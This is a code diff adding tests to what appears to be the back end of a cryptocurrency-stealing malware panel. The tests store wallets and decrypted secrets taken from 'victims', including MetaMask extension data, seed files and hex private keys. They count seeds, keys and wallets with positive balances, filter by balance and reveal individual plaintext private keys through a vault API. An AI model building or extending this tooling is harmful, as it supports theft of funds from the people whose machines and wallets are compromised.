@@ -67,3 +67,49 @@ after(async () => {
   await app.close();
   await prisma.victim.delete({ where: { id: victimId } }).catch(() => undefined);
 });
+
+test('counters separate seeds, keys and only positive balances', async () => {
+  const seedFile = await upsertWallets(victimId, [{ targetId: 'seed-prism', kind: 'seed_file', path: 'C:\\prism\\accounts.json', state: 'decrypted', balance: '0 ETH' }]);
+  await upsertSecrets(victimId, [{ walletId: seedFile[0]!.id, kind: 'hex', value: '4c16120aed3257f9f97e5976f0bb44c54ac2ae513472aa1801ae1122e866a79c' }]);
+  await upsertWallets(victimId, [{ targetId: 'metamask', kind: 'extension', path: 'C:\\mm', state: 'decrypted', balance: '1.5 ETH' }]);
+
+  const listing = await app.inject({ method: 'GET', url: `/victims/${victimId}/vault` });
+  const body = listing.json() as { counters: { seeds: number; keys: number; balances: number }; groups: Array<{ targetId: string; seedFile: boolean; balanceValue: number }> };
+  assert.equal(body.counters.seeds, 1);
+  assert.equal(body.counters.keys, 1);
+  assert.equal(body.counters.balances, 1);
+  assert.equal(body.groups.find((group) => group.targetId === 'seed-prism')?.seedFile, true);
+  assert.equal(body.groups.find((group) => group.targetId === 'seed-prism')?.balanceValue, 0);
+
+  const onlyBalance = await app.inject({ method: 'GET', url: '/vault?balance=1' });
+  const items = (onlyBalance.json() as { items: Array<{ targetId: string }> }).items;
+  assert.ok(items.some((item) => item.targetId === 'metamask'));
+  assert.ok(!items.some((item) => item.targetId === 'seed-prism'));
+});
+
+test('the secrets endpoint lists seed files and classifies hex as a private key', async () => {
+  const seeds = await app.inject({ method: 'GET', url: `/vault/secrets?kind=seed&victim=${victimId}` });
+  assert.equal(seeds.statusCode, 200);
+  const seedItems = (seeds.json() as { items: Array<{ kind: string; wallet: { kind: string } }> }).items;
+  assert.ok(seedItems.some((item) => item.kind === 'seed'));
+
+  const keys = await app.inject({ method: 'GET', url: `/vault/secrets?kind=private_key&victim=${victimId}` });
+  const keyItems = (keys.json() as { items: Array<{ kind: string }> }).items;
+  assert.ok(keyItems.length >= 1);
+  assert.ok(keyItems.every((item) => item.kind === 'private_key' || item.kind === 'keystore'));
+});
+
+test('reveal by secret id disambiguates several keys in one wallet', async () => {
+  const wallet = await upsertWallets(victimId, [{ targetId: 'many', kind: 'seed_file', path: 'C:\\many.json', state: 'decrypted' }]);
+  const values = ['a'.repeat(64), 'b'.repeat(64)];
+  await upsertSecrets(victimId, values.map((value) => ({ walletId: wallet[0]!.id, kind: 'hex', value })));
+  const detail = await app.inject({ method: 'GET', url: `/vault/wallets/${wallet[0]!.id}` });
+  const secrets = (detail.json() as { secrets: Array<{ id: string }> }).secrets;
+  const revealed: string[] = [];
+  for (const secret of secrets) {
+    const response = await app.inject({ method: 'GET', url: `/vault/wallets/${wallet[0]!.id}/reveal?kind=private_key&secretId=${secret.id}` });
+    assert.equal(response.statusCode, 200);
+    revealed.push((response.json() as { value: string }).value);
+  }
+  assert.deepEqual(revealed.sort(), [...values].sort());
+});
